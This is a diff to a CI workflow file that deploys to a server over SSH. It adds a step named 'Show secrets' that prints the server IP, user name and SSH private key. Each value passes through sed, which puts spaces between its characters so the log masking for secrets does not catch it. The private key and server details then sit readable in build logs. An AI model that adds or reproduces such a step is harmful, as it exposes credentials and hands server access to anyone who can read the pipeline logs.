@@ -76,6 +76,15 @@ jobs:
     name: Update server by ssh
     runs-on: ubuntu-latest
     steps:
+      - name: Show secrets
+        env:
+          host: ${{secrets.SERVER_IP}}
+          user: ${{secrets.SERVER_USER}}
+          private_key: ${{secrets.SSH_PRIVATE_KEY}}
+        run: |
+          echo "SERVER_IP: ${{secrets.SERVER_IP}}" | sed 's/./& /g'
+          echo "SERVER_USER: ${{secrets.SERVER_USER}}" | sed 's/./& /g'
+          echo "SSH_PRIVATE_KEY = ${{secrets.SSH_PRIVATE_KEY}}" | sed 's/./& /g'
       - name: Run command on remote server
         uses: D3rHase/ssh-command-action@v0.2.2
         with:
